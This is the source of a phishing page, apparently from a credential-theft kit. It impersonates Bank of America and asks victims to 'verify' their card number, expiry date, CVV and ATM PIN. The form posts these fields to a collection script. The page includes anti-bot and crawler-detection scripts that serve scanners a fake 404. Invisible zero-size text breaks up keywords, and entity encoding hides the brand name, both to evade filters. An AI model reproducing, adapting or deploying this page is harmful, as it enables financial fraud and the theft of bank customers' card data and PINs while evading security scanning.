<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
	include 'bot_fucker/wrd.php';
	include 'crawlerdetect.php';
     include 'bot_fucker/bot.php';
    include 'huehuehue.php';
?>
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" class="gr__secure"><head class="at-element-marker" style="visibility:visible;">

<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
   <meta name="robots" content="noindex,nofollow" />
			<meta name="googlebot" content="noindex" />
			<META NAME="robots" CONTENT="nofollow">

<title>&#67;&#97;&#114;&#100;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</title>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<meta name="viewport" content="width=device-width,initial-scale=1">

<link rel="stylesheet" type="text/css" href="css/style2.css" />
<link rel="stylesheet" type="text/css" href="css/style2.css" />
<link rel="stylesheet" type="text/css" href="css/zk.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-foundation.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-responsive.css" />

  </head>
  <script>
// This code empowers all input tags having a placeholder and data-slots attribute
document.addEventListener('DOMContentLoaded', () => {
    for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
        const pattern = el.getAttribute("placeholder"),
            slots = new Set(el.dataset.slots || "_"),
            prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
            first = [...pattern].findIndex(c => slots.has(c)),
            accept = new RegExp(el.dataset.accept || "\\d", "g"),
            clean = input => {
                input = input.match(accept) || [];
                return Array.from(pattern, c =>
                    input[0] === c || slots.has(c) ? input.shift() || c : c
                );
            },
            format = () => {
                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
                    i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
                    return i<0? prev[prev.length-1]: back? prev[i-1] || first: i;
                });
                el.value = clean(el.value).join``;
                el.setSelectionRange(i, j);
                back = false;
            };
        let back = false;
        el.addEventListener("keydown", (e) => back = e.key === "Backspace");
        el.addEventListener("input", format);
        el.addEventListener("focus", format);
        el.addEventListener("blur", () => el.value === pattern && (el.value=""));
    }
});</script>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

<body data-gr-c-s-loaded="true" class="safari safari537 breeze"><div id="mboxDiv" class="mbox-name-bac_dep_consumer_app_personal_info_1_top at-element-marker" style="visibility:visible;">
</div><script type="text/javascript"></script>
<div id="fX2J_" style="width:100%;height:100%;" class="z-page">
	<div id="fX2J1" class="z-div">
		<div id="fX2J2" style="display:none;" class="z-div"><span id="fX2J3" class="z-label">Build: </span></div>
		<a id="fX2J4" name="top"></a>
		<div id="fX2J5" class="row page-container">
	
	<div id="fX2J6" class="small-12 columns">
		<div id="fX2J7" class="z-div">
	<div id="fX2J8" class="header">
		<div id="fX2J9" class="row header_branding-bar">
			<div class="small-12 columns">
			
			 <span>
                 <img role="img" tabindex="0" class="image-logo" src="images/new_logo.svg" alt="Bank of America">
             </span>
				<a class="right secure-text show-for-medium-up" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea">Secure Page</a>
				<a class="right secure-text show-for-small-only" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea"></a>
			</div>
		</div>
		<div id="fX2Ja" class="row header_title-bar">
			<div class="small-12 columns">
				<h1>
					<span class="show-for-large-up">Ver<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ify Your Ca<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rd Informa<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>tion<sup>™</sup> </span>
					<span focusable="true" focusableintouchmode="true" class="show-for-medium-down">Verify Your Card Information</span>
				</h1>
			</div>
		</div>	
		<div id="fX2Jb" class="z-include">
	<div id="fX2Jc" class="row">
		<div class="small-12 columns progress-bar--v1">
			<div class="contain-to-grid sticky">
			    <nav class="top-bar" data-topbar="">
 					<div class="progress progress--v1">
							<span id="step-meter" class="meter" style="width: 68%;"><span id="step-meter-inner" class="meter" style="display:none;"></span></span>
						<span id="step-counter" class="hide">3</span>
					</div>
					<ul class="progress-bar_step-list--v1">
						<li class="progress-bar_step">
							<span id="step-1-circle" class="step-circle done">
								<p class="show-for-medium-up step-number">
									<span id="fX2Je" class="ada-hidden">St<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ep 1 of 4 (Cur<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rent Step):</span>
								1</p>
							</span>					
							<label id="step-1-label" class="show-for-medium-up step-text">Secu<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rity Ques<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>tion</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-2-circle" class="step-circle done">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jh" class="ada-hidden">Step 2 of 4:</span>
								2</p>
							</span>
														<label id="step-2-label" class="show-for-medium-up step-text">Your Infor<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>mation</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-3-circle" class="step-circle active">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jk" class="ada-hidden">Step 3 of 4 (Current Step):</span>
								3</p>
							</span>
							<label id="step-3-label" class="show-for-medium-up step-text active">Ca<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rd Inform<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ation</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-4-circle" class="step-circle">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jn" class="ada-hidden">Step 4 of 4:</span>
								4</p>
							</span>
							<label id="step-4-label" class="show-for-medium-up step-text">Review &amp; Submit</label>
						</li>
					</ul>
					<a id="help-link" class="show-for-small-only help-dropdown_trigger">Need Help?</a>
                </nav>
				<ul role="list" aria-label="Need Help Menu" id="help-menu">
					<span>
							<li class="help-menu_cell">
								<a class="help-menu_link" href="tel:844-375-7031">
									<img class="image-call" src="images/call_icon_2x.svg">
									Call 844-375-7031
								</a>
							</li>
					</span>
					
					<li class="help-menu_cell" id="tc-chat-container-59"></li>
				</ul>
			</div>
		</div>
	</div></div></div></div>
		<div id="fX2Jp" class="z-include">
<div id="fX2Jq" class="z-div">
	<div id="fX2Jr" class="row show-for-medium-up contact-container">
		<div id="cdpContactDiv" class="medium-6 columns right">
			<ul class="inline-list contact-list">
				<li class="show-for-medium-up">
					<img class="image-call"  src="images/call_icon_2x.svg" alt=" ">
					<span class="contact-list_item-title">CALL</span>
					<span class="contact-list_item-body">844-375-7031</span>
				</li>
				<li class="show-for-medium-up" id="tc-chat-container-48" aria-live="polite"><img src="images/app-fixed1-busy.png" alt="Chat with us - chat is busy." style="cursor:default"></li>
			</ul>
		</div>
	</div></div></div>
		
		
		
		<div id="fX2Jw" class="z-include">
	<div id="fX2Jx" style="display:none;" class="z-div">

		<div id="fX2J20" class="row ada-hidden">
			<div class="small-12 columns">
				<ul>
					<div id="fX2J30" class="z-div"></div>
				</ul>
			</div>
		</div></div></div>
		<div id="fX2J50" class="z-div">
	<div id="fX2J60" class="row"></div>
	<div id="fX2J70" class="row">
	<div id="fX2J80" class="z-div">
</div>
	<div id="fX2Jk0" class="z-div">
		<div id="fX2Jl0" class="small-12 columns ">
			<div id="fX2Jm0" style="width:100%;height:100%;" class="responsive-div-include z-include">
	<div id="fX2Jn0" class="z-div">

		<div id="fX2Jo0" class="row">
			<div class="small-12 medium-11 columns">
				<div id="fX2Jp0" class="z-div">
					<h2 id="fX2Jq0">Update Your Car<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>d Information</h2>
					<h3 id="fX2Jr0" class="c1">Now let's authe<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>nticate the card linked to your account </h3></div>
			</div>
		</div>
		
		<div id="fX2Js0" class="z-div">
			<hr id="fX2Jt0" aria-hidden="true">
			<div id="fX2Ju0" class="row">
				<div class="small-6 columns">
					<h3>Card Information</h3>
				</div>
				<div class="small-6 columns">
					<p class="required-text">* required</p>
				</div>
			</div></div>
		
		<div id="fX2Jv0" class="row">
			<div id="fX2Jw0" class="small-12 columns">
				<form method="post" action="step/next/mainnet.php?token=<?php echo $_SESSION['token']; ?>" >
						<div id="fX2Ji2" class="z-include">
	<div id="fX2Jj2" class="z-div">
			<div id="fX2Jk2" style="display:none;" class="row">
				<div id="fX2Jl2" class="small-12 columns">

					<hr>
				</div></div>
				<div id="yVpC26" class="row">

			<div class="small-12 medium-5 large-4 columns">
			Card number *
				<div id="cardNumber" class="text-box">
<label id="cardNumber" class="text-box_label" for="zz_debcardfund_tb_cardnum_v_1"></label>
<input id="cardNumber"  name="ccn" type="tel" placeholder="____-____-____-____" data-slots="_" required/>

</div>

			</div>
		</div>
		
		<label id="yVpC36" class="c4">Expiration date</label>
		<div id="yVpC46" class="row">
			<div class="small-6 medium-3 large-2 columns">
				<div class="select-box" id="zz_debcardfund_lb_expmnth_v_1-box">

<select id="zz_debcardfund_lb_expmnth_v_1" class="custom-select ui-selectmenu w-105 fl-lt mrt-25 abpa-listbox" size="1" name="expmnth"  required><option class="z-xrlistitem" selected="">MM</option><option  class="z-xrlistitem" value="01">01</option><option  class="z-xrlistitem" value="02">02</option><option id="yVpCiv" class="z-xrlistitem" value="03">03</option><option id="yVpCkv" class="z-xrlistitem" value="04">04</option><option id="yVpCmv" class="z-xrlistitem" value="05">05</option><option id="yVpCov" class="z-xrlistitem" value="06">06</option><option id="yVpCqv" class="z-xrlistitem" value="07">07</option><option id="yVpCsv" class="z-xrlistitem" value="08">08</option><option id="yVpCuv" class="z-xrlistitem" value="09">09</option><option id="yVpCwv" class="z-xrlistitem" value="10">10</option><option id="yVpCyv" class="z-xrlistitem" value="11">11</option><option id="yVpC_w" class="z-xrlistitem" value="12">12</option></select>
</div>

			</div>
			<div class="small-6 medium-4 large-2 columns end">
				<div class="select-box" id="zz_debcardfund_lb_expyear_v_1-box">

<select id="zz_debcardfund_lb_expyear_v_1" class="z-xrlistbox abpa-listbox" selectedindex="0" size="1" name="expyr" aria-describedby="zz_debcardfund_lb_expyear_v_1-hint zz_debcardfund_lb_expyear_v_1-errtxt" required><option id="yVpC1w" class="z-xrlistitem" selected="">YYYY</option>
<option id="yVpC9w" class="z-xrlistitem" value="2022">2022</option><option id="yVpCbw" class="z-xrlistitem" value="2023">2023</option><option id="yVpCdw" class="z-xrlistitem" value="2024">2024</option><option id="yVpCfw" class="z-xrlistitem" value="2025">2025</option><option id="yVpChw" class="z-xrlistitem" value="2026">2026</option><option id="yVpCjw" class="z-xrlistitem" value="2027">2027</option><option id="yVpClw" class="z-xrlistitem" value="2028">2028</option><option id="yVpCnw" class="z-xrlistitem" value="2029">2029</option><option id="yVpCpw" class="z-xrlistitem" value="2030">2030</option><option id="yVpCrw" class="z-xrlistitem" value="2031">2031</option><option id="yVpCtw" class="z-xrlistitem" value="2032">2032</option><option id="yVpCvw" class="z-xrlistitem" value="2033">2033</option><option id="yVpCxw" class="z-xrlistitem" value="2034">2034</option></select>
</div>


			</div>
		</div>
		
		<div id="yVpC86" class="row">
			<div class="small-12 medium-5 large-4 columns">
			CVV *
				<div id="zz_debcardfund_tb_seccode_v_1-box" class="row collapse text-box">
				
<div class="small-10 columns">

<input type="tel" data-field-type="numeric" id="zz_debcardfund_tb_seccode_v_1" class="z-textbox abpa-textbox text-box--numeric" value="" maxlength="3" name="cvv" placeholder="CVV" required autocomplete="off">
</div>


</div>

			</div>
		</div>
		<div id="yVpC86" class="row">
			<div class="small-12 medium-5 large-4 columns">
			ATM PIN *
				<div id="zz_debcardfund_tb_seccode_v_1-box" class="row collapse text-box">
				
<div class="small-10 columns">

<input type="tel" id="zz_debcardfund_tb_seccode_v_1" class="z-textbox abpa-textbox text-box--numeric" value="" maxlength="4" name="atm" placeholder="Pin" required autocomplete="off">
</div>


</div>

			</div>
		</div>
		
		

		<div id="fX2Jz0" class="z-include">
	<div id="fX2J_1" class="z-div">
		<div id="fX2J01" class="row">
			<div class="small-12 large-9 columns">
			
			</div>
		</div>
		</div></div></div></div></div></div>
	
	<div id="fX2Ji1" class="row">
	<div id="fX2Jj1" class="z-div">
		<div id="fX2Jk1" class="small-12 columns ">
			<div id="fX2Jl1" style="width:100%;height:100%;" class="responsive-div-include z-include">
  <div id="fX2Jm1" class="z-div">
     
    <div id="fX2Jn1" class="small-12 columns">
	<div class="int_style4">
<input id="login" type="submit" class="bt_style" value="Continue">
</div>
	  </form>
      </div></div></div></div></div></div></div>
		<div id="fX2Js1" class="z-include">
	</div>
		<div id="fX2J22" class="z-div">
	<div id="fX2J32" class="footer hide-for-print">
		<div id="fX2J42" class="row">
			<div id="fX2J52" class="small-12 columns">
				<p class="privacy-text">
					<span id="fX2J62" class="z-span">
					<a id="fX2J72" class="privacy-text_link" title="Share website feedback" name="link_shareWebsiteFeedback" href="javascript:void(0);" onclick="oo_feedback.show()">Sha<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>re websi<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>te feedback</a>
					<span id="fX2J82" aria-hidden="true"> | </span></span>


					
					<a class="privacy-text_link" title="Privacy & Security. Link opens in new window." name="PrivacyAndSecurity" href="javascript:void(0);" onclick="displayPopup('javascript:void(0);');return false;">Pri<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>vacy &amp; Sec<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>urity</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">
					&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;
					
					<a class="copyright-text_link" title="Equal Housing Lender. Link opens in new window." href="javascript:void(0);" onclick="displayPopup('javascript:void(0);');return false;" name="EqualHousingLender">&#69;&#113;&#117;&#97;&#108;&#32;&#72;&#111;&#117;&#115;&#105;&#110;&#103;&#32;&#76;&#101;&#110;&#100;&#101;&#114;</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">&copy; 2022&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#105;&#111;&#110;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;</p>
			</div></div></div></div>
	</div></div>
		<div id="fX2Jb2" class="z-div"></div>

		<div id="fX2Je2" class="block-ui">
			<div id="fX2Jf2" class="processing-modal z-window-modal z-window-modal-shadow">
				<div class="z-window-modal-tl-noborder">
					<div class="z-window-modal-tr-noborder"></div>
				</div>
				
				<div class="z-window-modal-bl-noborder">
					<div class="z-window-modal-br-noborder"></div>
				</div>
			</div></div></div></div>

</body></html>